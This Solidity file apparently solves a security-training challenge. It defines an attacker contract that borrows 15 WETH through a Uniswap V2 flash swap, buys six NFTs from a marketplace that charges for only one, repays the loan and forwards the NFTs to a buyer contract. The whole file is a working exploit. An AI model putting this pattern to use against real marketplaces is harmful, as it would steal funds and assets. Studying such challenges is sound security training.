// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

/**
 * @title AttackerContract
 * @dev A contract to perform a flash loan attack to buy NFTs from a marketplace
 */
contract AttackerContract {
    IUniswapV2Pair private immutable pair;
    IWETH private immutable weth;
    IERC721 private immutable nft;
    IMarketplace private immutable marketplace;

    address freeRiderBuyer;
    address attacker;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    /**
     * @dev Constructor to initialize the contract
     * @param _pair Address of the Uniswap V2 pair contract
     * @param _marketplace Address of the marketplace contract
     * @param _weth Address of the WETH contract
     * @param _nft Address of the NFT contract
     * @param _freeRiderBuyer Address of the freeRiderBuyer contract
     */
    constructor(address _pair, address _marketplace, address _weth, address _nft, address _freeRiderBuyer) {
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        freeRiderBuyer = _freeRiderBuyer;
        attacker = msg.sender;
    }

    /**
     * @dev Initiates the attack by performing a flash swap
     */
    function attack() external payable {
        // Perform a flashSwap
        bytes memory data = abi.encode(NFT_PRICE);
        pair.swap(NFT_PRICE, 0, address(this), data);
    }

    /**
     * @dev Callback function for Uniswap V2 flash swap
     * @param sender Address initiating the callback
     * @param amount0 Amount of token0 being borrowed
     * @param amount1 Amount of token1 being borrowed
     * @param data Additional data passed in the callback
     */
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        // Access control
        require(msg.sender == address(pair), "Caller is not the pair contract");
        require(tx.origin == attacker, "Caller is not the attacker");
        
        // Convert WETH to ETH
        weth.withdraw(NFT_PRICE);

        // Buy 6 NFTs
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // Pay back 15 WETH + 0.3% to the pair contract
        uint256 amountPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountPayBack}();
        weth.transfer(address(pair), amountPayBack);
        
        // Send NFTs to freeRiderBuyer contract to get the job payout
        for (uint i = 0; i < tokens.length; i++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer, tokens[i]);
        }
    }

    /**
     * @dev Handles the receipt of an NFT
     * @param operator The address which called `safeTransferFrom` function
     * @param from The address which previously owned the token
     * @param tokenId The NFT identifier which is being transferred
     * @param data Additional data with no specified format
     * @return A bytes4 value indicating success
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes memory data
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
     * @dev Fallback function to receive ETH
     */
    receive() external payable {}
}
